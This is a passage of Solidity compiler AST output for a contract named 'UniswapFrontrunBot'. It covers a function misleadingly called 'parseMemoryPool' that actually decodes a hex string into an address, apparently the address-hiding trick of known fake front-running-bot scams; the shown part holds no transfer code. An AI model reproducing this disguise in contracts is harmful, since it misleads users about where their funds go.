																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 854,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 852,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 751,
																				"src": "9303:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 853,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9309:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "9303:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 855,
																		"nodeType": "ExpressionStatement",
																		"src": "9303:8:0"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 895,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 888,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 744,
																	"src": "9499:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 893,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 891,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 889,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 748,
																					"src": "9509:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3136",
																					"id": 890,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9514:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_16_by_1",
																						"typeString": "int_const 16"
																					},
																					"value": "16"
																				},
																				"src": "9509:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 892,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 751,
																				"src": "9519:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"src": "9509:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		}
																	],
																	"id": 894,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9508:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "9499:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 896,
															"nodeType": "ExpressionStatement",
															"src": "9499:23:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 763,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 757,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 754,
														"src": "8853:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														},
														"id": 762,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 758,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8857:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															},
															"id": 761,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 759,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8861:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"nodeType": "BinaryOperation",
															"operator": "*",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3230",
																"id": 760,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8865:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_20_by_1",
																	"typeString": "int_const 20"
																},
																"value": "20"
															},
															"src": "8861:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_40_by_1",
																"typeString": "int_const 40"
															}
														},
														"src": "8857:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_42_by_1",
															"typeString": "int_const 42"
														}
													},
													"src": "8853:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 898,
												"initializationExpression": {
													"assignments": [
														754
													],
													"declarations": [
														{
															"constant": false,
															"id": 754,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 898,
															"src": "8841:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 753,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "8841:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 756,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 755,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "8850:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "8841:10:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 766,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 764,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 754,
															"src": "8869:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "32",
															"id": 765,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8874:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_2_by_1",
																"typeString": "int_const 2"
															},
															"value": "2"
														},
														"src": "8869:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 767,
													"nodeType": "ExpressionStatement",
													"src": "8869:6:0"
												},
												"nodeType": "ForStatement",
												"src": "8836:698:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 901,
															"name": "iaddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 744,
															"src": "9559:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														],
														"id": 900,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "9551:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
														},
														"typeName": {
															"id": 899,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9551:7:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 902,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9551:14:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"functionReturnParameters": 735,
												"id": 903,
												"nodeType": "Return",
												"src": "9544:21:0"
											}
										]
									},
									"documentation": null,
									"id": 905,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "parseMemoryPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 732,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 731,
												"mutability": "mutable",
												"name": "_a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 905,
												"src": "8658:16:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 730,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "8658:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8657:18:0"
									},
									"returnParameters": {
										"id": 735,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 734,
												"mutability": "mutable",
												"name": "_parsed",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 905,
												"src": "8699:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 733,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "8699:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8698:17:0"
									},
									"scope": 1680,
									"src": "8633:940:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 913,
										"nodeType": "Block",
										"src": "9813:104:0",
										"statements": [
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "9833:77:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "9848:51:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "9875:4:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "9881:2:0",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "9871:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "9871:13:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9865:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9865:20:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "self",
																				"nodeType": "YulIdentifier",
																				"src": "9893:4:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9887:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9887:11:0"
																	}
																],
																"functionName": {
																	"name": "keccak256",
																	"nodeType": "YulIdentifier",
																	"src": "9855:9:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "9855:44:0"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "9848:3:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 910,
														"isOffset": false,
														"isSlot": false,
														"src": "9848:3:0",
														"valueSize": 1
													},
													{
														"declaration": 907,
														"isOffset": false,
														"isSlot": false,
														"src": "9875:4:0",
														"valueSize": 1
													},
													{
														"declaration": 907,
														"isOffset": false,
														"isSlot": false,
														"src": "9893:4:0",
														"valueSize": 1
													}
												],
												"id": 912,
												"nodeType": "InlineAssembly",
												"src": "9824:86:0"
											}
										]
									},
									"documentation": null,
									"id": 914,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "keccak",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 908,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 907,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 914,
												"src": "9758:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 906,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "9758:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9757:19:0"
									},
									"returnParameters": {
										"id": 911,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 910,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 914,
												"src": "9800:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 909,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "9800:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9799:13:0"
									},
									"scope": 1680,
									"src": "9742:175:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1069,
										"nodeType": "Block",
										"src": "10209:945:0",
										"statements": [
											{
												"assignments": [
													922
												],
												"declarations": [
													{
														"constant": false,
														"id": 922,
														"mutability": "mutable",
														"name": "count",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1069,
														"src": "10220:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 921,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10220:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 924,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 923,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10233:1:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10220:14:0"
											},
											{
												"assignments": [
													926
												],
												"declarations": [
													{
														"constant": false,
														"id": 926,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1069,
														"src": "10245:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 925,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10245:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 928,
												"initialValue": {
													"argumentTypes": null,
													"id": 927,
													"name": "a",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 916,
													"src": "10254:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10245:10:0"
											},
											{
												"body": {
													"id": 939,
													"nodeType": "Block",
													"src": "10281:56:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 933,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "10296:7:0",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 932,
																	"name": "count",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 922,
																	"src": "10296:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 934,
															"nodeType": "ExpressionStatement",
															"src": "10296:7:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 937,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 935,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 926,
																	"src": "10318:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 936,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10323:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10318:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 938,
															"nodeType": "ExpressionStatement",
															"src": "10318:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 931,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 929,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 926,
														"src": "10273:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 930,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10278:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "10273:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 940,
												"nodeType": "WhileStatement",
												"src": "10266:71:0"
											},
											{
												"assignments": [
													942
												],
												"declarations": [
													{
														"constant": false,
														"id": 942,
														"mutability": "mutable",
														"name": "res",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1069,
														"src": "10347:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 941,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10347:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 947,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 945,
															"name": "count",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 922,
															"src": "10376:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 944,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "10366:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 943,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10370:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 946,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10366:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10347:35:0"
											},
											{
												"body": {
													"id": 983,
													"nodeType": "Block",
													"src": "10422:115:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 962,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 958,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 926,
																	"src": "10437:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 961,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 959,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 916,
																		"src": "10441:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "3136",
																		"id": 960,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10445:2:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_16_by_1",
																			"typeString": "int_const 16"
																		},
																		"value": "16"
																	},
																	"src": "10441:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "10437:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 963,
															"nodeType": "ExpressionStatement",
															"src": "10437:10:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 977,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 964,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 942,
																		"src": "10462:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 970,
																	"indexExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 969,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 967,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 965,
																				"name": "count",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 922,
																				"src": "10466:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 966,
																				"name": "i",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 949,
																				"src": "10474:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "10466:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 968,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "10478:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "10466:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "10462:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 974,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 926,
																					"src": "10500:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 973,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "10494:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 972,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "10494:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 975,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10494:8:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 971,
																		"name": "toHexDigit",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1432,
																		"src": "10483:10:0",
																		"typeDescriptions": {
